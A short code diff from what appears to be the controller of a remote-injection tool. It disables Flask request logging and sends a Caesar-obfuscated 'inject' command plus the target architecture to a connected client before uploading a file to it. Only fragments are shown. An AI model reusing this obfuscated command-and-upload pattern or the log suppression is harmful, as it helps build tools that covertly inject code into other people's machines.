@@ -145,8 +145,8 @@ def upload_file(fp, sock):
 
 app = Flask(__name__) 
 # Disable Flask's default logging
-#log = logging.getLogger('werkzeug')
-#log.disabled = True
+log = logging.getLogger('werkzeug')
+log.disabled = True
 
 @app.route('/<path:filename>')
 def serve_file(filename):
@@ -559,10 +559,7 @@ def main() -> None :
                 continue
 
             client.send(CAESAR("inject").encode())
-            if arch == "32" :
-                client.send(CAESAR("x86").encode())
-            else :
-                client.send(CAESAR("x64").encode())
+            client.send(CAESAR(arch).encode())
 
             fp = open(fichier, "rb")
             upload_file(fp, client)
